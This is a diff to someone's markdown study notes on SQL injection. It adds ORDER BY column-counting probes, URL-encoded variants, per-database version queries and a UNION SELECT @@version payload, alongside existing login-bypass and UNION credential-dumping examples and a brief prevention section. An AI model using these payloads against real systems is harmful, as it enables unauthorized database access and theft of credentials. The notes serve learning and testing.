@@ -26,7 +26,10 @@ when the attacker uses the same communication channel to both launch the attack 
 
     - the number and order of columns must be the same in all queries, data type must be the same
     - to determine the column (use ORDER BY, use NULL VALUES)
-
+    `' ORDER by 3 --  (some doesn't accept -- so we can use #)`
+    `' ORDER by 3 # (to url encode, CTRL+U)`
+- 'ORDER+by+2%23 if 200 okay, 2 columns present
+- 'ORDER+by+3%23 if 500 internal server error, 3rd column not present
 
 
     `www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
@@ -95,10 +98,10 @@ Depends on the perspective of testing
 
 + Some other common locations where SQL injection arises are:
 
-In UPDATE statements, within the updated values or the WHERE clause.
-In INSERT statements, within the inserted values.
-In SELECT statements, within the table or column name.
-In SELECT statements, within the ORDER BY clause.
+- In UPDATE statements, within the updated values or the WHERE clause.
+- In INSERT statements, within the inserted values.
+- In SELECT statements, within the table or column name.
+- In SELECT statements, within the ORDER BY clause.
 
 ### Some common SQL injection examples include:
 
@@ -111,14 +114,21 @@ __double-dash sequence -- is a comment indicator in SQL, and means that the rest
 
 `username: bhbjhb' or 1=1 --  password: jnkjkj`
 `username: bhbjhb--`
-SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+SELECT * FROM products WHERE category = 'Gifts'-- AND released = 1
 
 __Since 1=1 is always true, the query will return all items.__
-SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
 
 * to expoit sql injection vulnerability, it is necessary to know some information like the type and version of the database software, the tables and columns that the database contains. 
 
-## Preventing SQL Vulneraberalities
+- Microsoft, MySQL	SELECT @@version
+- Oracle	SELECT * FROM v$version
+- PostgreSQL	SELECT version()
+`' UNION SELECT @@version--`
+
+
+
+#### Preventing SQL Vulneraberalities
 * use prepared statements (parameterized queries)
 
 #### scripting
